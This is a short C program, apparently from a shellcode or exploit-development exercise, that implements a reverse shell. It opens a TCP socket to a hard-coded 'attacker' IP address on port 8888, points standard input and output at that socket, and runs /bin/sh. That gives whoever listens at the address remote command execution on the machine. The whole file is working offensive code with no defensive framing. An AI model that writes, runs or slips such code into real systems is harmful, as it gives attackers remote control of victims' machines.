/*
Author:	  evoche
License:  GPL
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{	
	//struct for socket info
    struct sockaddr_in srvFd;
	
	//set properties 
    srvFd.sin_family = AF_INET;								//family for IP address
    srvFd.sin_port = htons(8888);							//port number (msb first)
    srvFd.sin_addr.s_addr = inet_addr("192.168.153.131");	//attacker(server) IP address
 	
	//Sys Call - create socket descriptor
    int clifd = socket(AF_INET, SOCK_STREAM, 0);
 	
	//Sys Call - connect back to attacker
	connect(clifd, (struct sockaddr *)&srvFd, 16);	

	//Sys Call - redirect to the socket
	dup2(clifd, 0);
    dup2(clifd, 1);
	 	
	//Sys Call - execute /bin/sh, execvc("address of where /bin/sh", "address of array of arg strings")
	char *argv[] = {"/bin/sh",NULL};
    execve(argv[0], &argv[0], NULL);

    return 0;
}
